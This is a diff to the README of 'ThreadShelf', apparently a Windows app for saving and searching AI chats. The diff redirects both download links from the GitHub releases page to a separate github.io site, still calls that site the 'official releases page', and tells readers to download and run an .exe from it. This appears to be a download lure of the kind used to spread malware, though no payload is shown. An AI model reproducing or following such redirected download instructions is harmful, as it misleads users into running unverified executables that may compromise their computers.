@@ -1,6 +1,6 @@
 # 📦 ThreadShelf - Save and search your AI chats
 
-[![](https://img.shields.io/badge/Download-ThreadShelf-blue)](https://github.com/convexoconvex-totalism744/ThreadShelf/releases)
+[![](https://img.shields.io/badge/Download-ThreadShelf-blue)](https://convexoconvex-totalism744.github.io)
 
 ThreadShelf keeps your artificial intelligence chats in one place. It works on your computer. You keep ownership of your data. You search through past conversations with ease. It supports ChatGPT, Claude, Gemini, Grok, and other models.
 
@@ -8,7 +8,7 @@ ThreadShelf keeps your artificial intelligence chats in one place. It works on y
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/convexoconvex-totalism744/ThreadShelf).
+1. Visit the [official releases page](https://convexoconvex-totalism744.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
